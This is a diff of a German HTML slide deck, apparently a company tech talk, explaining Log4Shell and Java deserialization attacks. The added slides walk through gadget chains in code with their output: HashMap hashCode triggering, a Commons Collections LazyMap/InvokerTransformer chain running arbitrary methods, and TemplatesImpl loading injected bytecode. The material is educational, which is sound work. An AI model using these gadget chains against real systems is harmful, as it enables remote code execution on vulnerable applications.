@@ -74,15 +74,15 @@ public @interface SpringBootIntegrationTest {
         </section>
 
         <section>
-          <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
-          <div class="content">
-            <h2>Was?</h2>
-            <ul>
-              <li>Funktioniert nur mit JDK < 8u...</li>
-            </ul>
-            <h2>Wie?</h2>
+            <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
+            <div class="content">
+                <h2>Was?</h2>
+                <ul>
+                    <li>Funktioniert nur mit JDK < 8u...</li>
+                </ul>
+                <h2>Wie?</h2>
 
-            <pre><code data-line-numbers="|5-7">package com.divae.tectalks.log4shell.exploit.basic.intro;
+                <pre><code data-line-numbers="|5-7">package com.divae.tectalks.log4shell.exploit.basic.intro;
 
 public class Step1_HelloWorld {
 
@@ -96,25 +96,25 @@ public class Step1_HelloWorld {
 
 }
             </code></pre>
-            <ul>
-              <li>...</li>
-            </ul>
-          </div>
+                <ul>
+                    <li>...</li>
+                </ul>
+            </div>
         </section>
 
         <section>
-          <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
-          <div class="content">
-            <h2>Was?</h2>
-            <ul>
-              <li>Funktioniert nur mit JDK < 8u...</li>
-            </ul>
-            <h2>Wie?</h2>
-            <ul>
-              <li>...</li>
-            </ul>
+            <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
+            <div class="content">
+                <h2>Was?</h2>
+                <ul>
+                    <li>Funktioniert nur mit JDK < 8u...</li>
+                </ul>
+                <h2>Wie?</h2>
+                <ul>
+                    <li>...</li>
+                </ul>
 
-            <pre><code data-line-numbers="|8|10-11">package com.divae.tectalks.log4shell.exploit.basic.intro;
+                <pre><code data-line-numbers="|8|10-11">package com.divae.tectalks.log4shell.exploit.basic.intro;
 
 import java.lang.reflect.Method;
 
@@ -131,23 +131,21 @@ public class Step2_ClassForName {
             </code></pre>
 
 
-
-
-          </div>
+            </div>
         </section>
 
         <section>
-          <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
-          <div class="content">
-            <h2>Was?</h2>
-            <ul>
-              <li>Funktioniert nur mit JDK < 8u...</li>
-            </ul>
-            <h2>Wie?</h2>
-            <ul>
-              <li>...</li>
-            </ul>
-            <pre><code data-line-numbers="|10|10,12|12,14-15|12|12,18-22">package com.divae.tectalks.log4shell.exploit.basic.intro;
+            <div class="header">Log4Shell &mdash; Nachladen von Bytecode</div>
+            <div class="content">
+                <h2>Was?</h2>
+                <ul>
+                    <li>Funktioniert nur mit JDK < 8u...</li>
+                </ul>
+                <h2>Wie?</h2>
+                <ul>
+                    <li>...</li>
+                </ul>
+                <pre><code data-line-numbers="|10|10,12|12,14-15|12|12,18-22">package com.divae.tectalks.log4shell.exploit.basic.intro;
 
 import java.io.File;
 import java.lang.reflect.Method;
@@ -172,7 +170,7 @@ public class Step3_ClassForBytes {
 }
             </code></pre>
 
-          </div>
+            </div>
         </section>
 
         <!--
@@ -202,14 +200,15 @@ public class Step3_ClassForBytes {
         </section>
 
         <section>
-            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Grundlagen der Java Serialisierung</div>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Serialisierung in Java</div>
             <div class="content">
-                <p>Daten mit Java Serialisieren und Deserialisieren</p>
-                <pre class="code"><code data-trim data-line-numbers="5-9|13-15|17-23|25-32" class="java">
+                <h1>Daten mit Java Serialisieren und Deserialisieren</h1>
+                <pre class="code"><code data-trim data-line-numbers="5-10|14-16|18-24|26-33" class="java">
 import java.io.*;
 
 public class SerializationBasics {
 
+    // Serialisierbare Klasse
     public static class SerializableClass implements Serializable {
 
         private int value = 0;
@@ -244,7 +243,7 @@ public class SerializationBasics {
 }
                 </code></pre>
                 <div class="fragment">
-                    <p class="play-icon">Ausgabe des Beispiels</p>
+                    <p>Ausgabe des Beispiels:</p>
                     <pre class="output"><code data-trim class="console">
 Eingelesener Wert: 1
                 </code></pre>
@@ -253,14 +252,15 @@ Eingelesener Wert: 1
         </section>
 
         <section>
-            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Grundlagen der Java Serialisierung</div>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Serialisierung in Java</div>
             <div class="content">
-                <p>Code beim De-/Serialisieren ausführen</p>
-                <pre class="code"><code data-trim data-line-numbers="5-17|21-33" class="java">
+                <h1>Eigenen Code bei der Serialisierung ausführen</h1>
+                <pre class="code"><code data-trim data-line-numbers="5-18|22-34" class="java">
 import java.io.*;
 
 public class SerializationBasics {
 
+    // Klasse mit eigener Serialisierungslogik
     public static class SerializableClass implements Serializable {
 
         private int value = 0;
@@ -296,7 +296,7 @@ public class SerializationBasics {
 }
                 </code></pre>
                 <div class="fragment">
-                    <p class="play-icon">Ausgabe des Beispiels</p>
+                    <p>Ausgabe des Beispiels</p>
                     <pre class="output"><code data-trim class="console">
 writeObject wird ausgeführt
 readObject wird ausgeführt
@@ -307,34 +307,203 @@ Eingelesener Wert: 0
         </section>
 
         <section>
-            <div class="header">Prästentationstitel - Kapitel</div>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
             <div class="content">
-                <pre><code data-trim data-line-numbers="5-7|10-12|14-18|20-25">
-import java.io.*;
+                <h1>Wie funktioniert ein Angriff über die Deserialisierung in Java?</h1>
+                <ul>
+                    <li>
+                        Ziel eines Angriffs
+                        <ul>
+                            <li>Eigenen Code in der Java Anwendung einschleusen und ausführen.</li>
+                            <li>In unserem Fall über serialisierte Daten.</li>
+                        </ul>
+                    </li>
+                    <li>
+                        Der Weg zum Ziel
+                        <ol>
+                            <li>Objekte geschickt kombinieren und serialisieren.</li>
+                            <li>Serialisierte Daten („Payload“) über <em>log4shell</em> Lücke in die Anwendung übertragen.</li>
+                            <li>Objekte werden deserialisiert und dabei der eigene Code instanziiert und ausgeführt.</li>
+                        </ol>
+                    </li>
+                </ul>
+            </div>
+        </section>
 
-public class SerializationBasics {
+        <section>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
+            <div class="content">
+                <h1>Eine HashMap als Ausgangspunkt</h1>
+                <p>Eine HashMap serialisiert nicht ihre interne Datenstruktur sondern direkt ihre Schlüssel und Einträge. Beim Deserialisieren werden diese wieder in die interne
+                    Datenstruktur eingefügt.</p>
+                <pre><code data-trim data-line-numbers="9,12,14,20">
+package java.util;
+
+public class HashMap&lt;K,V> extends AbstractMap&lt;K,V>
+    implements Map&lt;K,V>, Cloneable, Serializable {
+…
+    private void readObject(java.io.ObjectInputStream s)
+        throws IOException, ClassNotFoundException {
+            …
+            // Die Einträge werden aus dem ObjectInputStream gelesen und eingefügt
+            for (int i = 0; i < mappings; i++) {
+                …
+                K key = (K) s.readObject();
+                V value = (V) s.readObject();
+                putVal(hash(key), key, value, false, false);
+            }
+    }
+…
+    static final int hash(Object key) {
+        int h;
+        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
+    }
+…
+}
+                </code></pre>
+                <p class="fragment">Damit kann die <code>.hashCode()</code> Implementierung serialisierbarer Klassen getriggert werden.</p>
+            </div>
+        </section>
+
+        <section>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
+            <div class="content">
+                <h1>Beliebige Methode im Classpath ausführen</h1>
+                <p>Über die geschickte Kombination verschiedener Features von Commons Collections können beim Deserialisieren beliebige Methoden im Classpath ausgeführt werden.</p>
+                <pre class="code"><code data-trim data-line-numbers="13-19|23-31|33-39|41-49">
+import com.divae.talks.log4shell.exploit.deserialization.ReflectionUtil;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CallingAnArbitraryConstructorOnDeserialization {
 
     public static class SerializableClass implements Serializable {
-        private int value = 0;
+
+        public void myMethod() {
+            System.out.println("myMethod wird ausgeführt");
+        }
+
     }
 
     public static void main(String[] args) throws Exception {
-        // Instantiate the object
-        SerializableClass serializableObject = new SerializableClass();
-        serializableObject.value = 1;
 
-        // Serialize the object into a file
+        // Objekt erzeugen
+        SerializableClass serializableObject = new SerializableClass();
+
+        // Instantiiert die übergebene Klasse mit einem Konstruktur mit der angegebenen Signatur und den Parametern
+        InvokerTransformer invokerTransformer = new InvokerTransformer<>("myMethod", new Class[0], new Object[0]);
+
+        // Ruft den invokerTransformer zum Erzeugen nicht vorhandener Einträge auf
+        LazyMap lazyMap = LazyMap.lazyMap(new HashMap(), invokerTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, serializableObject);
+
+        // Erzeuge eine HashMap mit 1 Eintrag
+        Map hashMap = new HashMap();
+        hashMap.put("this key will be replaces by tiedMapEntry", "a value");
+
+        // Ersetzte den Schlüssel des Eintrags über Reflection
+        Object firstMapEntry = hashMap.entrySet().iterator().next();
+        ReflectionUtil.setFieldValue(firstMapEntry, "key", tiedMapEntry);
+
         try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
              ObjectOutputStream out = new ObjectOutputStream(file)) {
-            out.writeObject(serializableObject);
+            out.writeObject(hashMap);
         }
 
-        // Deserialize the file to an object
         try (FileInputStream file = new FileInputStream("serialized-data.tmp");
              ObjectInputStream in = new ObjectInputStream(file)) {
-            SerializableClass deserializedObject = (SerializableClass) in.readObject();
-            System.out.println("Deserialized value (should be 1): " + deserializedObject.value);
+            in.readObject();
         }
+
+    }
+
+}
+                </code></pre>
+                <div class="fragment">
+                    <p>Ausgabe des Beispiels:</p>
+                    <pre class="output"><code data-trim class="console">
+myMethod wird ausgeführt
+                </code></pre>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
+            <div class="content">
+                <h1>Klasse aus serialisierten Daten instantiieren</h1>
+                <p>In Kombination mit dem vorherigen Kniff, lässt sich mit eine Klasse der XSLT Bibliothek Apache Xalan eine eigene Klasse aus serialisierten Daten
+                    initialisieren.</p>
+                <pre class="code"><code data-trim data-line-numbers="11-12|14-18|20-27,31|29-30">
+import com.divae.talks.log4shell.exploit.deserialization.ReflectionUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import java.io.*;
+import java.nio.file.Files;
+
+public class Step4_InstantiatingClassFromSerializedData {
+
+    public static void main(String[] args) throws Exception {
+
+        // Bytecode der auf dem Zielsystem ausgeführt werden soll
+        byte[] classBytes = Files.readAllBytes(new File("target/test-classes/com/divae/talks/log4shell/TransletPayload.class").toPath());
+
+        TemplatesImpl templates = new TemplatesImpl();
+        // Füge Bytecode in templates Objekt ein
+        ReflectionUtil.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
+        // Damit beim Deserialisieren nicht zu früh eine NullPointerException auftritt
+        ReflectionUtil.setFieldValue(templates, "_name", "");
+
+        try (FileOutputStream file = new FileOutputStream("serialized-data.tmp");
+             ObjectOutputStream out = new ObjectOutputStream(file)) {
+            out.writeObject(templates);
+        }
+
+        try (FileInputStream file = new FileInputStream("serialized-data.tmp");
+             ObjectInputStream in = new ObjectInputStream(file)) {
+            TemplatesImpl deserializedTemplates = (TemplatesImpl) in.readObject();
+
+            // Wird dann am Ende durch den Kniff im vorherigen Beispiel ersetzt
+            deserializedTemplates.newTransformer();
+        }
+
+    }
+
+}
+                </code></pre>
+                <div class="fragment">
+                    <p>Ausgabe des Beispiels:</p>
+                    <pre class="output"><code data-trim class="console">
+Payload in static initializer of TransletPayload
+Exception in thread "main" java.lang.NullPointerException
+	at …
+                    </code></pre>
+                    <p>Den Fehler kann „getrost“ ignoriert werden, da der gewünschte Code bereits ausgeführt wurde.</p>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <div class="header">Die Technik hinter Log4Shell & Co. &mdash; Angriff über die Deserialisierung</div>
+            <div class="content">
+                <h1>Eine HashMap als Ausgangspunkt</h1>
+                <pre><code data-trim data-line-numbers="6-9">
+public class Blx {
+
+    public static void main(String[] args) throws Exception {
+
+        LazyMap lazyMap = LazyMap.lazyMap(emptyMap, chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "non existing key");
+
+        // Triggert die Initialisierung
+        tiedMapEntry.hashCode();
+
     }
 
 }
@@ -379,9 +548,9 @@ public class SerializationBasics {
             <div class="footnote">
                 <p>Copyright © diva-e
                 <p>Alle Angaben basieren auf dem derzeitigen Kenntnisstand. Änderungen vorbehalten. Dieses Dokument der diva-e Digital Value Excellence GmbH ist ausschließlich für
-                    den Adressaten bzw. Auftraggeber bestimmt. Es bleibt bis zur einer ausdrücklichen Übertragung von Nutzungsrechten Eigentum der diva-e. Jede Bearbeitung,
+                    den Adressaten bzw. Auftraggeber bestimmt. Es bleibt bis zu einer ausdrücklichen Übertragung von Nutzungsrechten Eigentum der diva-e. Jede Bearbeitung,
                     Verwertung, Vervielfältigung und/oder gewerbsmäßige Verbreitung des Werkes ist nur mit Einverständnis von diva-e zulässig.
-                <p>All content is based on the current state of communication. Subject to change. This document of diva-e Digital Value Exellence GmbH is only intended for the
+                <p>All content is based on the current state of communication. Subject to change. This document of diva-e Digital Value Excellence GmbH is only intended for the
                     client. It belongs to diva-e until its explicit transfer of usage rights. Any adaptation, utilization, copy and/or professional spreading has to be approved by
                     diva-e.
             </div>
